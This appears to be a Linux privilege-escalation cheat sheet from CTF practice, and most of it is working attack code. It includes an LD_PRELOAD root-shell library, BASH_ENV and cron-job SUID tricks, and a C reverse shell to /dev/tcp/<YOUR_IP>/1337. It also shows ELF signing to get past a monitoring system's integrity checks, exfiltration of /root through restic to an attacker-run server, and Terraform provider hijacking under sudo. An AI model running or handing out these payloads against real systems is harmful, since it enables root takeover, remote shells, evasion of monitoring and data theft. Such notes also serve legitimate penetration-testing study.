##  Privilege Escalation via Python

```python
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> Spawns a root shell if the script is run with root privileges.

---

##  LD\_PRELOAD + sudo

`LD_PRELOAD` is an environment variable used by the dynamic linker to load a custom shared library before any others.  This allows overriding standard library functions — useful for debugging, but exploitable for privilege escalation if preserved by `sudo`.
### 🔹 Exploit example

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void run_me_first() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

**Compile:**

```bash
gcc -fPIC -shared -o exploit.so exploit.c
```

**Run:**

```bash
sudo LD_PRELOAD=./exploit.so /usr/bin/ping
```

---

## BASH_ENV + sudo

`BASH_ENV` is an environment variable read by **bash** before executing any non-interactive script.  
### 🔹 Exploit example

If `sudo -l` contains:

```bash
env_keep+="BASH_ENV"
```

then `sudo` will preserve this variable, allowing privilege escalation if you can run a bash script as root.

```bash
echo '/bin/bash -p' > /tmp/root.sh
chmod +x /tmp/root.sh
sudo BASH_ENV=/tmp/root.sh /usr/bin/systeminfo
```

Here, `/usr/bin/systeminfo` is a root-allowed bash script.  
Before executing it, bash will source `/tmp/root.sh`, spawning a root shell.

--- 
##  Crontab 

###  🔹Where to look:

- `/etc/crontab`
- `/etc/cron.*/*`
- Systemd timers (`systemctl list-timers`)

###  🔹Exploitation Steps:

1. **Identify a writable target**:

   - Check if you can edit a script or file executed by the cronjob.

2. **Inject malicious code**:

   - For example, add a reverse shell or privilege escalation payload to the script:
     ```bash
     #!/bin/bash
     chmod u+s /bin/bash
     ```
   - This will set the SUID bit on `/bin/bash`, allowing root shell access with:
     ```bash
     /bin/bash -p
     ```

3. **Wait for the cronjob to run** — Check the timing configuration of the cronjob. Crontab lines follow this format:

```
# ┌───────────── minute (0 - 59)
# │ ┌───────────── hour (0 - 23)
# │ │ ┌───────────── day of month (1 - 31)
# │ │ │ ┌───────────── month (1 - 12)
# │ │ │ │ ┌───────────── day of week (0 - 7) (Sunday is 0 or 7)
# │ │ │ │ │
# * * * * *  user-name  command-to-be-executed
```
---

##  Crontab → SUID bash

```python
os.system('chmod u+s /bin/bash')
```

Then:

```bash
/bin/bash -p
```

> Runs bash with root privileges if the SUID bit is set.

---

##  SUID via C binary

```c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

> Compiles a binary that spawns a root shell when executed by a script with SUID. Look [[UID]] for more details

---

## Reverse Shell via C binary 

```c
#include <unistd.h>
int main() {
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1", NULL);
    return 0;
}
```

> Compiles a binary that spawns a  reverse shell on port 1337 when executed by a root srcipt like cronjob (RUID = 0)

---
## ELF Signing Tool

To bypass signature verification by the monitoring system, we signed the ELF binary using:

[linux-elf-binary-signer GitHub repository](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)

Sign the binary with:
```bash
./elf-sign sha256 key.pem key.pem monitor
```

This generates a signed ELF executable that passes integrity checks during the scan.

---
## NBackrest (Restic abuse)

Abuse NBackrest’s ability to run `restic` as **root** to back up `/root` to an attacker-controlled REST backend, then restore locally and grab `root.txt` / SSH keys.

**Rest-server GitHub repository**: [https://github.com/restic/rest-server/](https://github.com/restic/rest-server/)

### Steps to Retrieve `/root`

#### 1) Start a REST backend on the attacker host
```bash
# On attacker
# <ATTACKER_IP> is your HTB/VPN IP; choose a port (e.g., 12345)
./rest-server --path /tmp/restic-data --listen :12345 --no-auth
```
- Stores encrypted repo data under `/tmp/restic-data/<repo_name>`.

#### 2) Configure NBackrest Repository on the target
In **Add/Edit Restic Repository**:
- **Repo Name:** anything (e.g., `repo2`)
- **Repository URI:**  
  ```
  rest:http://<ATTACKER_IP>:12345/myrepo2
  ```
- **Password:** choose a passphrase (e.g., `123456`) — you’ll need this to decrypt later.

#### 3) Initialize the remote repository
In NBackrest **Run Command** (for this repo):
```
-r rest:http://<ATTACKER_IP>:12345/myrepo2 init
```

#### 4) Backup `/root` as **root** to your REST repo
Still in **Run Command**:
```
-r rest:http://<ATTACKER_IP>:12345/myrepo2 backup /root
```

You should see:
```
snapshot <ID> saved
Files: XX new
Dirs:  XX new
Added to the repository: X.XXX MiB
```

#### 5) Restore the loot locally (attacker)
```bash
# List snapshots
restic -r /tmp/restic-data/myrepo2 snapshots
# enter the same password you set in NBackrest (e.g., 123456)

# Restore
restic -r /tmp/restic-data/myrepo2 restore <SNAP_ID> --target ./restore

# Get root.txt
cat ./restore/root/root.txt
```

---

## Terraform Provider Override Abuse

### Example `sudo -l` Output
```
User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir=/opt/examples apply
```

> If `sudo -l` shows you can run **`terraform apply`** as root, you may be able to escalate.  
> Terraform executes external **provider binaries** (e.g. `terraform-provider-examples`) during `apply`.  
> With `!env_reset` in sudoers, environment variables survive, allowing you to override provider resolution with a malicious binary.

- Terraform loads **providers** as local executables.  
- You can use `TF_CLI_CONFIG_FILE` to point Terraform to a custom config file.  
- With a **dev_overrides** in that file, you redirect Terraform to load a provider binary you control.  
- When root’s Terraform runs, it executes **your binary as root**.  

### Steps to Exploit
1. Create `terraform.rc` with a `dev_overrides` pointing to your folder:
   ```hcl
   provider_installation {
     dev_overrides {
       "path/to/the/provider" = "/local/path/to/custom/provider"
     }
     direct {}
   }
   ```

2. Export the config:
   ```bash
   export TF_CLI_CONFIG_FILE=/path/to/terraform.rc
   ```

3. Place a fake provider binary named `terraform-provider-examples` in `/local/path/to/custom/provider`.

4. Run the allowed sudo command:
   ```bash
   sudo /usr/bin/terraform -chdir=/opt/examples apply
   # type "yes" when prompted
   ```

5. Your binary is executed **as root** when Terraform loads the provider.

---
